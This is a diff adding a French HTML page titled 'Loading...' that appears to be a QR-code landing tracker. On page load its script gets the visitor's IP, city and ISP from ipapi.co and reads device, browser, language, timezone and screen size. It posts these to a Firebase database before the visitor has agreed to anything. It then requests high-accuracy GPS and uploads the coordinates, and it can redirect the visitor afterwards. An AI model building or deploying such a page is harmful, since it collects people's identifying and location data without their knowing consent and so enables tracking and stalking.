@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chargement...</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#0a0a0a;color:#fff;font-family:'Space Mono',monospace;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden}
+  .grid{position:fixed;inset:0;background-image:linear-gradient(rgba(0,255,136,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.04) 1px,transparent 1px);background-size:40px 40px;pointer-events:none}
+  .card{background:#111;border:1px solid #1e1e1e;border-radius:16px;padding:48px 40px;max-width:440px;width:90%;text-align:center;position:relative;z-index:1}
+  .dot{width:12px;height:12px;background:#00ff88;border-radius:50%;margin:0 auto 24px;animation:pulse 1.5s infinite}
+  @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,255,136,.4)}50%{box-shadow:0 0 0 12px rgba(0,255,136,0)}}
+  h1{font-size:1.1rem;color:#555;letter-spacing:.2em;text-transform:uppercase;margin-bottom:8px}
+  .status{font-size:1.4rem;font-weight:700;color:#00ff88;margin-bottom:32px}
+  .info-grid{display:grid;gap:12px;text-align:left}
+  .info-row{background:#0d0d0d;border:1px solid #1a1a1a;border-radius:8px;padding:14px 16px;display:flex;justify-content:space-between;align-items:center;font-size:.75rem}
+  .info-label{color:#444;letter-spacing:.1em}
+  .info-value{color:#e0e0e0;font-weight:700;max-width:200px;text-align:right;word-break:break-all}
+  .loc-btn{margin-top:24px;background:transparent;border:1px solid #00ff88;color:#00ff88;padding:12px 24px;border-radius:8px;font-family:'Space Mono',monospace;font-size:.8rem;cursor:pointer;letter-spacing:.1em;transition:.2s;width:100%}
+  .redirect-msg{margin-top:20px;font-size:.7rem;color:#333}
+  .spinner{display:inline-block;width:10px;height:10px;border:2px solid #333;border-top-color:#00ff88;border-radius:50%;animation:spin .6s linear infinite;margin-right:6px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="grid"></div>
+<div class="card">
+  <div class="dot"></div>
+  <h1>QR Scan Détecté</h1>
+  <div class="status" id="status">Collecte en cours...</div>
+  <div class="info-grid" id="info-grid"></div>
+  <button class="loc-btn" id="locBtn"><span class="spinner"></span> Localisation GPS en cours...</button>
+  <p class="redirect-msg" id="redirect-msg"></p>
+</div>
+
+<script>
+const FIREBASE_URL = 'https://qr-tracker-d4cb6-default-rtdb.firebaseio.com';
+const REDIRECT_URL = '';
+
+function formatDate(d){
+  return d.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'}) + ' ' +
+    d.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+}
+
+function getDeviceInfo(){
+  const ua = navigator.userAgent;
+  let device = 'Inconnu';
+  if(/iPhone/i.test(ua)) device = 'iPhone';
+  else if(/iPad/i.test(ua)) device = 'iPad';
+  else if(/Android/i.test(ua)) device = 'Android';
+  else if(/Windows/i.test(ua)) device = 'Windows PC';
+  else if(/Mac/i.test(ua)) device = 'Mac';
+  else if(/Linux/i.test(ua)) device = 'Linux';
+  let browser = 'Inconnu';
+  if(/Chrome/i.test(ua) && !/Edge|OPR/i.test(ua)) browser = 'Chrome';
+  else if(/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+  else if(/Firefox/i.test(ua)) browser = 'Firefox';
+  else if(/Edge/i.test(ua)) browser = 'Edge';
+  return {device, browser};
+}
+
+function addRow(label, value, id){
+  const div = document.createElement('div');
+  div.className = 'info-row';
+  if(id) div.id = id;
+  div.innerHTML = `<span class="info-label">${label}</span><span class="info-value">${value}</span>`;
+  document.getElementById('info-grid').appendChild(div);
+}
+
+async function saveToFirebase(data){
+  try {
+    const res = await fetch(`${FIREBASE_URL}/scans.json`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(data)
+    });
+    const result = await res.json();
+    return result.name;
+  } catch(e){ return null; }
+}
+
+async function updateFirebase(key, data){
+  try {
+    await fetch(`${FIREBASE_URL}/scans/${key}.json`, {
+      method: 'PATCH',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(data)
+    });
+  } catch(e){}
+}
+
+let scanData = {};
+let firebaseKey = null;
+
+function requestLocation(){
+  const btn = document.getElementById('locBtn');
+  btn.innerHTML = '<span class="spinner"></span> Localisation GPS en cours...';
+  btn.disabled = true;
+  navigator.geolocation.getCurrentPosition(
+    async pos => {
+      const {latitude:lat, longitude:lon, accuracy, altitude} = pos.coords;
+      scanData.lat = lat; scanData.lon = lon;
+      scanData.accuracy = Math.round(accuracy);
+      if(firebaseKey) await updateFirebase(firebaseKey, {lat, lon, accuracy: Math.round(accuracy), altitude: altitude?Math.round(altitude):null});
+      btn.innerHTML = `✅ ${lat.toFixed(6)}, ${lon.toFixed(6)} (±${Math.round(accuracy)}m)`;
+      btn.style.borderColor = '#00ff88';
+      document.getElementById('row-lat').querySelector('.info-value').textContent = lat.toFixed(7);
+      document.getElementById('row-lon').querySelector('.info-value').textContent = lon.toFixed(7);
+      document.getElementById('row-acc').querySelector('.info-value').textContent = `±${Math.round(accuracy)} m`;
+    },
+    () => {
+      btn.innerHTML = '📍 GPS refusé — cliquer pour réessayer';
+      btn.disabled = false;
+      btn.onclick = requestLocation;
+      if(firebaseKey) updateFirebase(firebaseKey, {gps_status:'refusé'});
+    },
+    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
+  );
+}
+
+async function init(){
+  const now = new Date();
+  const {device, browser} = getDeviceInfo();
+  const lang = navigator.language || 'Inconnu';
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Inconnu';
+  const screen_res = `${screen.width}x${screen.height}`;
+  const referrer = document.referrer || 'Direct / QR Code';
+
+  let ip='?', country='?', city='?', isp='?';
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const d = await r.json();
+    ip=d.ip||'?'; country=d.country_name||'?'; city=d.city||'?'; isp=d.org||'?';
+  } catch(e){}
+
+  scanData = {
+    id: Date.now(), date: formatDate(now), timestamp: now.toISOString(),
+    ip, country, city, isp, device, browser, lang, tz, screen_res, referrer,
+    lat:null, lon:null, accuracy:null
+  };
+
+  firebaseKey = await saveToFirebase(scanData);
+  document.getElementById('status').textContent = firebaseKey ? 'Scan enregistré ✓' : '⚠️ Erreur Firebase';
+
+  addRow('Date & Heure', formatDate(now));
+  addRow('Adresse IP', ip);
+  addRow('Pays', country);
+  addRow('Ville', city);
+  addRow('FAI / Réseau', isp);
+  addRow('Appareil', device);
+  addRow('Navigateur', browser);
+  addRow('Langue', lang);
+  addRow('Fuseau horaire', tz);
+  addRow('Résolution', screen_res);
+  addRow('Latitude', 'En attente...', 'row-lat');
+  addRow('Longitude', 'En attente...', 'row-lon');
+  addRow('Précision GPS', 'En attente...', 'row-acc');
+
+  requestLocation();
+
+  if(REDIRECT_URL){
+    let s=5; const msg=document.getElementById('redirect-msg');
+    const t=setInterval(()=>{msg.textContent=`Redirection dans ${--s}s...`;if(s<=0){clearInterval(t);window.location.href=REDIRECT_URL;}},1000);
+  }
+}
+init();
+</script>
+</body>
+</html>
